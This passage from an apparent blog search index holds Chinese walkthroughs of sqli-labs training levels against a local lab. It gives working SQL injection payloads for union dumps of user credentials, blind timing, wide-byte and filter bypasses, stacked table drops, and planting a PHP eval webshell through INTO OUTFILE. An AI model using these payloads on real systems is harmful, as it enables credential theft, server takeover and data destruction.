users--+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十三关GET联合推荐报错","slug":"sqli-labs关卡/sqli-labs第二十三关GET联合推荐报错","date":"2020-07-25T01:18:02.452Z","updated":"2020-07-16T11:37:57.867Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十三关GET联合推荐报错/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88%E6%8E%A8%E8%8D%90%E6%8A%A5%E9%94%99/","excerpt":"","text":"推荐使用报错注入基于之前1’可以返回错误，报错注入直接查看当前数据库 因为该关卡过滤了注释符#和 – 所以需要使用其他方法闭合单引号 ‘ 可以使用针对于sql-labs特殊使用的注释符;%00 也可以使用 and ‘1’=’1 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;1&#39; order by 4 ;%00没有这个字段，说明字段是3 查询库名 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,database() ;%00 查询表名 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; ;%00 查询users字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; ;%00 查询数据 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,group_concat(username) from users ;%00","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十七关过滤空格绕过","slug":"sqli-labs关卡/sqli-labs第二十七关过滤空格绕过","date":"2020-07-25T01:18:02.450Z","updated":"2020-03-24T07:21:49.720Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十七关过滤空格绕过/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/","excerpt":"","text":"查看初始页面 查看当前字段数 1234使用%0a因为过滤了空格，所以使用%0a进行绕过使用;%00sqli中特殊注释符，因为注释符被过滤使用特殊注释符进行绕过http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1&#39; order%0aby %0a 4%0a;%00并没有4这个字段 查看3字段是否存在 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1&#39; order%0aby %0a 3%0a;%00页面返回正常 查看注入点 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39; %0a uNion %0a sElect %0a 1,2,3 ;%00 查看当前数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39; %0a uNion %0a sElect %0a 1,2,database() ;%00 查看表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39; %0a uNion %0a sElect %0a 1,2,group_concat(table_name)from%0ainformation_schema.tables%0awhere%0atable_schema&#x3D;&#39;security&#39; ;%00 查看users表中的字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39; %0a uNion %0a sElect %0a 1,2,group_concat(column_name)from%0ainformation_schema.columns%0awhere%0atable_name&#x3D;&#39;users&#39; ;%00 查看username字段中的表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39; %0a uNion %0a sElect %0a 1,2,group_concat(username)from%0ausers ;%00","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十一关cookie","slug":"sqli-labs关卡/sqli-labs第二十一关cookie","date":"2020-07-25T01:18:02.448Z","updated":"2020-03-19T02:31:01.795Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十一关cookie/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/","excerpt":"","text":"抓取cookie包发送的repeater模块运行，返回这种结果 查看cookie值，发现是经过加密的 解密工具进行解密 12345%3D是&#x3D;等于号的意思YWRtaW4%3D将%30改为&#x3D;YWRtaW4&#x3D;解密之后发现是admin 1这样就可以在这个基础上将输入的sql语句进行加密执行 1查看字段数，回显正常，正确 1查看当前数据库 1返回正确 1查看表 1查看结果 1查看users表字段 1查看结果 1查看username字段 1查看结果","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二关GET联合","slug":"sqli-labs关卡/sqli-labs第二关GET联合","date":"2020-07-25T01:18:02.445Z","updated":"2020-03-16T02:50:34.420Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二关GET联合/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/","excerpt":"","text":"1先测试一下当前字段数，输入4错误，我们试一下3，输入3正确，说明我们当前字段是3 12查看当前可以注入点发现注入点是2和3，在2或者3的位置进行注入 12查看当前数据库，我们在2的位置注入，当前库名是securityhttp:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,database(),3 12我们查看了当前security库里的库名，有emails，referers，uagents，usershttp:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39; 123大部分情况下users是存放用户信息的，我们查看一下是否存放着用户信息，http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;发现当前库名中有这些字段，发现有id，password，username，这三个字段，这正是我们需要的字段 123查询这三个字段的数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(id,username,password),3 from users查出了当前三个表的内容","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第九关GET时间","slug":"sqli-labs关卡/sqli-labs第九关GET时间","date":"2020-07-25T01:18:02.411Z","updated":"2020-03-17T02:29:47.884Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第九关GET时间/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/","excerpt":"","text":"我们发现当不管输入单引号还是双引号，还是括号统统返回you are in，我们尝试一下使用sleep来延迟一下看看是否存在sql注入漏洞，先试一下单引号、 可以看到执行了12秒，说明了单引号存在漏洞 123测试当前数据库第一个字母http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))--+当前为115是返回结果是2秒表示语句执行正确，我们查看一下其他的，看一下我们我们的结论是否正确 1我们将之前的115 改成了116发现执行了12秒表示错误，我们可以判断，115是正确的，这里用的ascii编码，115对应的是s，因为之前推断的缘故，我们这里推断他的库名是security，更改,1,1的第一个数字就可以查看第二个字符 123查看当前数据库的第一个表名的第一个字母http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,sleep(10),1) --+因为将sleep延迟语句写在后面所有，当语句正确时，执行sleep延时注入， 12我们查看其它的ascii是否还是返回正常发现当数据错误时，两秒就返回了，按照这个方法以此类推 1234我们查看emails的第一个字段的第一个字母?id&#x3D;1&#39; and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,sleep(5),1) --+我们这里查询第一个字母是不是105，因为105对应的字母是i，数据库emails里面第一个字段数就是i这里返回正确表示确实是i 12切换成其他的ascii查看一下我们换成104 发现返回时间2秒，说明当前错误，我们可以确定我们之前写得语句正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十四关POST宽字节","slug":"sqli-labs关卡/sqli-labs第三十四关POST宽字节","date":"2020-07-25T01:18:02.409Z","updated":"2020-03-24T07:32:57.490Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十四关POST宽字节/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/","excerpt":"","text":"查看登录后的页面，页面返回正常，因为是登录框所以是post注入。 加入单引号查看是否有报错信息。发现报错信息中有反斜杠，说明要在post中使用宽字节注入 加入反斜杠和%df查看结果 ，发现还存在单引号，并且报错了， 1uname&#x3D;admin%df\\&#39; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 使用注释符，页面返回正常 使用order by 查看字段数，我们发现居然没有3这个字段，返回了错误 1uname&#x3D;admin%df\\&#39; order by 3 # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 在尝试一下2这个字段，字段2返回正常，说明这一题和其他的字段数不同 1uname&#x3D;admin%df\\&#39; order by 2 # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 使用联合查询查看注入点 1uname&#x3D;admin%df\\&#39; union select 1,2 # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看数据库 1uname&#x3D;admin%df\\&#39; union select 1,database() # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看表，因为这里用了宽字节注入所以需要将库名转换为16进制 1uname&#x3D;admin%df\\&#39; union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479 # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看users表 1uname&#x3D;admin%df\\&#39; union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273 # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看username字段 1uname&#x3D;admin%df\\&#39; union select 1,group_concat(username)from users # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十关JSP环境联合注入","slug":"sqli-labs关卡/sqli-labs第三十关JSP环境联合注入","date":"2020-07-25T01:18:02.407Z","updated":"2020-03-24T07:30:10.574Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十关JSP环境联合注入/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/","excerpt":"","text":"和29关相同只是将单引号变成了双引号 查看字段数，字段3返回正常，4返回错误。 查看注入点，注入点是2,3 查看但前数据库 查看表名 查看users表 查看username字段","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十六关GET宽字节","slug":"sqli-labs关卡/sqli-labs第三十六关GET宽字节","date":"2020-07-25T01:18:02.405Z","updated":"2020-03-24T07:34:06.035Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十六关GET宽字节/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/","excerpt":"","text":"查看源码，发现$id是单引号闭合的。 尝试单引号闭合，发现有反斜杠，说明宽字节注入 加上反斜杠查看一下报错信息，返回三个反斜杠， 加上%df查看一下，页面报错，返回后面有两个引号 这里用注释符注释一下，页面返回正常 查看字段数，字段是为4的时候报错 查看字段数3，页面返回正确，说明当前字段数为3 查看注入点，注入点为2,3 查看当前数据库，数据库为security 查看表名，因为是宽字节注入，所以需要将表名使用16进制1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-36&#x2F;?id&#x3D;111111%df\\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+ 查看users表1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-36&#x2F;?id&#x3D;111111%df\\&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273 --+ 查看username字段1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-36&#x2F;?id&#x3D;111111%df\\&#39; union select 1,2,group_concat(username)from users --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十八关GET堆叠","slug":"sqli-labs关卡/sqli-labs第三十八关GET堆叠","date":"2020-07-25T01:18:02.379Z","updated":"2020-03-24T07:35:32.040Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十八关GET堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3GET%E5%A0%86%E5%8F%A0/","excerpt":"","text":"查看原始界面。 使用单引号 使用注释符 使用堆叠，向数据库插入表，前面需要加分号分隔 在mysql数据库查看数据，成功插入 删除表 查看mysql数据库，表没有了，说明语句正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十五关GET宽字节","slug":"sqli-labs关卡/sqli-labs第三十五关GET宽字节","date":"2020-07-25T01:18:02.377Z","updated":"2020-03-24T07:33:25.791Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十五关GET宽字节/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/","excerpt":"","text":"查看初始页面。 查看源码，使用了gbk编码，$id并没有引号包裹 查看当前字段数，字段3返回正常 字段4返回错误，说明当前字段为3 查看注入点1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,3 查看当前数据库 查看表，因为用的是gbk编码将security改为16进制数1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479 查看users表1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273 查看username字段1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(username)from users","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十二关JSP环境宽字节","slug":"sqli-labs关卡/sqli-labs第三十二关JSP环境宽字节","date":"2020-07-25T01:18:02.376Z","updated":"2020-03-24T07:31:03.600Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十二关JSP环境宽字节/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/","excerpt":"","text":"查看初始页面。 加上单引号查看报错信息，返回错误，引号中有一个反斜杠，可以判定为宽字节注入 可以先尝试将引号中按照要求加入反斜杠，再次查询，发现返回这么多反斜杠 id=1’———-&gt;id=1&#39;———&gt;id=1%5c%27 id=1%df’———id=1%df%5c%27———-&gt;id=1%DF5C%27——–&gt;id=1運’ 其实就是利用gbk是多字节的编码，两个字节代表一个汉字 %df %5c 组合出了一个 運 字 因此 可以注入 将%df带入，页面返回正常 查看当前字段数，字段4返回错误 使用字段3，返回正确 查看注入点，注入点2,3 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\\&#39; union select 1,2,3 --+ 查看当前数据库 查看表名，在宽字节中不能使用 ‘security’ ，而需要使用database()来获取表名， 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()--+ 也可以将security编码成16进制 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479--+ 获取users表下的字段，还是使用16进制方法 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\\&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273--+ 查看suername字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\\&#39; union select 1,2,group_concat(username)from users--+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十九关GET堆叠","slug":"sqli-labs关卡/sqli-labs第三十九关GET堆叠","date":"2020-07-25T01:18:02.374Z","updated":"2020-03-24T07:44:35.373Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十九关GET堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/","excerpt":"","text":"查看初始界面 加上单引号，页面只返回两个引号，说明$id没有包裹 查看一下源码，判断正确，$id没有引号包裹 使用堆叠，向数据库插入表，页面返回正常 12使用堆叠需要在 1 后面加分号分隔，说明这是两个语句，使用注释符将limit注释http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-39&#x2F;?id&#x3D;1 ; create table crow like users --+ 在数据库中查看，插入成功 删除crow 表，删除成功 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-39&#x2F;?id&#x3D;1 ; drop table crow --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十三关GET宽字节","slug":"sqli-labs关卡/sqli-labs第三十三关GET宽字节","date":"2020-07-25T01:18:02.371Z","updated":"2020-03-24T07:32:12.527Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十三关GET宽字节/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/","excerpt":"","text":"查看最初界面。 查看源码，使用单引号闭合 加上单引号查看，发现返回反斜杠，说明宽字节注入 按照要求加入反斜杠，确定为宽字节注入 加入%df，报错了，发现没有用注释符注释引号 加上注释符，页面返回正常 查看字段数，4报错 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;1%df\\&#39; order by 4 --+ 查看字段数3，页面回显正常，说明字段数正确 查看注入点 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\\&#39; union select 1,2,3 --+ 查看当前数据库 查看表，将security转换成16进制数，因为这是宽字节注入 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+ 查看users，也需要换成16进制 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\\&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273 --+ 查看username字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\\&#39; union select 1,2,group_concat(username)from users --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十七关POST宽字节","slug":"sqli-labs关卡/sqli-labs第三十七关POST宽字节","date":"2020-07-25T01:18:02.369Z","updated":"2020-03-24T07:34:33.983Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十七关POST宽字节/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/","excerpt":"","text":"查看登录后的原始界面，页面返回正常。 使用单引号查看报错信息，有反斜杠，确定宽字节注入 宽字节注入使用%df加反斜杠\\1uname&#x3D;admin%df\\&#39; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 使用注释符注释并用order by 查询字段数，字段3错误1uname&#x3D;admin%df\\&#39; order by 3 #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看字段2，字段2正确 查看注入点1uname&#x3D;admin%df\\&#39; union select 1,2 #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看数据库 查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制1uname&#x3D;admin%df\\&#39; union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479 #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看users表，也需要改为16进制1uname&#x3D;admin%df\\&#39; union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273 #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 查看username字段1uname&#x3D;admin%df\\&#39; union select 1,group_concat(username)from users #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三十一关JSP环境联合","slug":"sqli-labs关卡/sqli-labs第三十一关JSP环境联合","date":"2020-07-25T01:18:02.367Z","updated":"2020-03-24T07:30:40.872Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三十一关JSP环境联合/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/","excerpt":"","text":"查看源码，发现只是在双引号的基础上加上了括号。 在网页中尝试，页面回显正常 查看当前字段数，字段数为3的时候返回正常，为4的时候返回错误 查看注入点 查看当前数据库 查看数据下的表 查看users表下的字段 查看username字段","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第三关GET联合","slug":"sqli-labs关卡/sqli-labs第三关GET联合","date":"2020-07-25T01:18:02.365Z","updated":"2020-03-16T03:08:10.452Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第三关GET联合/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/","excerpt":"","text":"12查看当前是否存在sql注入，http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39; 123我们发现报错了，报错内容里显示引号后面有一个括号，加上括号试试记住因为加上引号了还要注释一下http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) --+返回正确，然后我们来查看字段数 12345查看当前数据库字段数http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3 --+order by 3为正确，我们再来试试4http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 4 --+4错误说明当前字段为3 1234查看当前数据库http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,database() --+这里在id&#x3D;1的地方加上一个负号，报错显示，如果不使用报错显示只会显示一个内容，我们看到了当前数据库是security 12我们查看security数据库下有什么表http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ 123发现有当前emails，referers，uagents，users，其中users在大部分情况下是存放用户信息的，我们来进行查看一下users表http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39; --+当前表下有这么多字段，其中发现有id，username，password字段，我们查看一下 123查看id，username，password字段里的数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(id,username,password)from users --+查询到了我们想要的内容","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第七关GET盲注","slug":"sqli-labs关卡/sqli-labs第七关GET盲注","date":"2020-07-25T01:18:02.362Z","updated":"2020-03-16T08:44:47.499Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第七关GET盲注/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"我们先进入第七关，这里提示错误说我们没有输入带参数的ID值。 我们输入?id=1,页面返回了You are in…. Use outfile…… 上面返回了You are in…. Use outfile……而outfile是mysql里面向系统写入文件的函数，然后我们可以尝试写入一句话木马 在写入木马前，先确定注入点，我们经常使用 ‘ “ ) ] 或者其他组合进行闭合，并且在后面加上 and 1=1–+或and 1=2–+ 进行判断闭合的正确性，例如：如果?id=1* and 1=1–+为真，且?id* and 1=2–+为假，那么*字符串就是有效的闭合符， 经过测试我们发现’))字符串可以闭合 然后进行测试字段数，使用order by来测试字段数，我们先尝试输入4，发现返回错误， 然我在尝试输入3试一下，发现返回正确，我们可以确定当前字段是3 然后我们插入一个文本试试，发现成功地插入了，虽然显示报错了，但是已经插入了 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\test.txt&quot; --+ 我们可以查看一下，成功地导入了文本 我们现在导入一句话木马，发现也是已经存在了一句话木马，已经成功地导入进去了 12其中一句话木马两边的单引号必须加不然无法导入http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;123&quot;])?&gt;&#39; into outfile &quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\test.php&quot;--+ 我们查看一下php文本里面是否有我们写入的一句话木马，可以发现我们插入的一句话木马已经存在了，虽然没有显示出来，但确实存在了，我们打开php文件看一下 发现确实导入了一句话木马，select……into outfile “地址”的方式插入了一句话木马到服务器，这一用法在我们实战环节中经常会用到。","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第一关GET联合","slug":"sqli-labs关卡/sqli-labs第一关GET联合","date":"2020-07-25T01:18:02.360Z","updated":"2020-03-01T04:41:41.942Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第一关GET联合/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/","excerpt":"","text":"这里判断发现1=1 和 1=2 都不报错，判断这不是整形注入 尝试闭合URL输入?id=1’ 我们这里使用单引号，有报错信息说明存在注入，没有过滤单引号，为了让单引号闭合，使用#(%23)注释符 报出如上错误，根据错误提示信息the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1猜测后端可能是：where id‘用户输入’LIMIT 0,1当用户直接输入*** ’时，造成了闭合这时就需要url的注释符#(%23)来注释，有时#不能用，就要用到#的url编码%23在与注释符#之间就可以进行sql注入，爆出我们想要的内容 使用order by 猜测字段，这里得到字段结果为3。因为3以上报错，输入3时正常 进行联合查询,查询出数据库，这里是security 使用mysql查看一下是否有这个数据库，发现这个数据库 查询表名，查询到了下面这四个表名 我们用mysql查看一下user里面是否有这些表，发现确实存在 用户的账户密码大部分都在users库里面，我们在查询表 查询users表，发现id、username、password等字段 我们查看这三个字段，里面是否有我们想要的内容 我们查询这三个字段发现，确实是我们要的账号，密码 使用mysql查看一下","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs46-49扩展","slug":"sqli-labs关卡/sqli-labs46-49扩展","date":"2020-07-25T01:18:02.345Z","updated":"2020-03-26T02:35:55.851Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs46-49扩展/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/","excerpt":"","text":"也可以插入一句话木马。 12如果这句代码没有将一句话木马写进去的话，是用另外一种方式select &lt;?php @eval($_POST[admin])?&gt; into outfile 